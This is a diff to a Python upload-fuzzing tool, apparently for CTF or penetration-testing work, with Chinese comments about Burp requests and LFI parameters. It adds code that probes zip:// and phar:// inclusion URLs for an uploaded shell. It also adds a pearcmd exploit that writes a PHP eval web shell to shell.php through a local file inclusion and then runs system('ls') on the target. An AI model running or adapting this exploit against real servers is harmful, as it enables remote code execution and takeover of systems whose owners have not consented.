@@ -1,9 +1,8 @@
 """
 TODO: 完成params传参
 0. 先用 web_format_bp_requests.py 格式化 burp 的请求为 python, 再替换对应参数。然后用下面逐个测试
-1. 可能要更新索引 post_files[key0]
-2. 配置 xpath 提取上期文件路径
-需要修改
+1. 如果有 $_GET['xxx']，填写对应 lfi 参数 ,并注释掉下一行
+
 3. 复制来的请求 要删除   header中   "Content-Type": "multipart/form-data; bou
 3. upload4_percent00_pass11 可能需要修改对应参数
 4. upload5_pass12
@@ -71,6 +70,7 @@ class FuzzUpload:
                 print('error ', shell_path)
             return
 
+        absolute = absolute or shell_path.startswith('http')
         if absolute:
             tmp_url = shell_path
         else:
@@ -82,6 +82,8 @@ class FuzzUpload:
 
         if shell_path:
             res_check = requests.get(tmp_url)
+            if check_str:
+                return check_str in res_check.text
             check_by_status_code(res_check, shell_path)
 
         return False
@@ -156,13 +158,40 @@ class FuzzUpload:
         post_data = data.copy()
         try:
             res = self.send_request(url=url, files=post_files, data=post_data)
-            self.check(shell or file_path)
-            print(f'shell is: {host}{lfi_url}zip://{upload_folder}/basic.jpg%23basic.php')
-            print(f'shell is: {host}{lfi_url}zip://{upload_folder}/basic.jpg%23basic.php')
-            print(f'shell is: {host}{lfi_url}phar://{upload_folder}/basic.jpg/basic.php')
-            print(f'shell is: {host}{lfi_url}phar://{upload_folder}/basic.jpg/basic')
+            # self.check(shell or file_path)
+            url1 = f'{host}{lfi_url}zip://{upload_folder}/basic.jpg%23basic.php'
+            url2 = f'{host}{lfi_url}zip://{upload_folder}/basic.jpg%23basic'
+            url3 = f'{host}{lfi_url}phar://{upload_folder}/basic.jpg/basic.php'
+            url4 = f'{host}{lfi_url}phar://{upload_folder}/basic.jpg/basic'
+            if self.check(url1, check_str='GIF89a'): print(url1)
+            if self.check(url2, check_str='GIF89a'): print(url2)
+            if self.check(url3, check_str='GIF89a'): print(url3)
+            if self.check(url4, check_str='GIF89a'): print(url4)
         except Exception as e:
             print('error ', file_path)
+
+    def upload2_3_pearcmd(self, shell=None):
+        import urllib.request, urllib.error
+        def send_get_request(url):
+            try:
+                response = urllib.request.urlopen(url)
+                # print(response.read())
+            except urllib.error.URLError as e:
+                print(f"请求发生错误: {e.reason}")
+
+        url = f'''{host}{lfi_url}/usr/local/lib/php/pearcmd&+config-create+/'<?=@eval($_GET[1]);?>'+./shell.php'''
+        send_get_request(url)
+
+        final_url1 = host + "/shell.php?1=system('ls');"
+        res = requests.get(final_url1)
+        if 'php' in res.text: print(f'final_url1: {final_url1}')
+
+        url = f'''{host}{lfi_url}/usr/local/lib/php/pearcmd.php&+config-create+/'<?=@eval($_GET[1]);?>'+./shell1.php'''
+        send_get_request(url)
+
+        final_url2 = host + "/shell1.php?1=system('ls');"
+        res = requests.get(final_url2)
+        if 'php' in res.text: print(f'final_url2: {final_url2}')
 
     def upload3_htaccess(self):
         print("Function name:", inspect.currentframe().f_code.co_name)
@@ -256,3 +285,4 @@ if __name__ == '__main__':
     #     fuzz_upload.upload2_1_script_language(shell='basic.jpg')
     if lfi_url:
         fuzz_upload.upload2_2_upload_zip(shell='basic.jpg')
+        fuzz_upload.upload2_3_pearcmd()
